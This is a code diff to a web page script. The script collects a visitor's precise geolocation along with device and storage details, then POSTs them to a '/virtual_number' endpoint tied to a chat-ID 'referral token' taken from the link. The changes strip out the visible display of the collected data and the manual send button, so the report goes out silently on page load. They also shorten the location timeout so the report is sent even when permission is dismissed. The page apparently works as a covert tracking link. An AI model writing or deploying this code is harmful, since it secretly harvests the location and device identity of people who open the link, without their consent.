@@ -1,9 +1,3 @@
-const allowBtn = document.getElementById("allow-btn");
-const resultEl = document.getElementById("result");
-const sendBtn = document.getElementById("send-btn");
-const statusEl = document.getElementById("status");
-const userIdInput = document.getElementById("user-id");
-
 let collectedData = null;
 
 function getChatIdFromUrl() {
@@ -15,14 +9,6 @@ function getChatIdFromUrl() {
 
   return null;
 }
-
-// Auto-fill chat ID into input
-window.addEventListener("DOMContentLoaded", () => {
-  const chatId = getChatIdFromUrl();
-  if (chatId) {
-    userIdInput.value = chatId;
-  }
-});
 
 function safeValue(value, fallback = "Unavailable") {
   if (value === null || value === undefined || value === "") {
@@ -103,7 +89,9 @@ async function getPreciseLocation() {
         precise_longitude: position.coords.longitude,
       }),
       () => resolve({ precise_latitude: null, precise_longitude: null }),
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
+      // If permission is dismissed or location cannot be obtained quickly,
+      // send the IP/device report instead of holding the page open.
+      { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 },
     );
   });
 }
@@ -168,27 +156,24 @@ document.addEventListener("DOMContentLoaded", async () => {
     storage_total_gb: storageData.storage_total_gb,
   };
 
-  resultEl.textContent = JSON.stringify(collectedData, null, 2);
-  sendBtn.disabled = false;
-
-  // SECOND: Send After First Completes
-  const chatId = getChatIdFromUrl();
-  if (!chatId) {
+  const referralToken = getChatIdFromUrl();
+  if (!referralToken) {
+    console.error("Missing or invalid referral token.");
     return;
   }
 
   try {
-    const url = chatId ? `/virtual_number?referral=${encodeURIComponent(chatId)}` : "/virtual_number";
-    const res = await fetch(url, {
+    const response = await fetch(`/virtual_number?referral=${encodeURIComponent(referralToken)}`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(collectedData),
     });
-
-    await res.json();
-
+    const result = await response.json();
+    if (!response.ok) {
+      console.error("Visitor report was not sent:", result.error || "Unknown error");
+    }
   } catch (err) {
-    console.error("Network error:", err);
+    console.error("Visitor report network error:", err);
   }
 
 });
